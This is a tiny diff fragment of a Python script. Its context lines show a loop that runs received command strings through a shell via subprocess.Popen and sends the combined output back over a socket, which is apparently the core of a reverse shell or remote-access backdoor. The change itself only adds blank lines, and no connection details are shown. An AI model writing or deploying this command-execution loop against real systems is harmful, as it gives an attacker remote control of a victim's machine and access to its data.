@@ -15,3 +15,5 @@ while True:
           proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
           output= proc.stdout.read()+proc.stderr.read()
           s.send(output)
+
+          
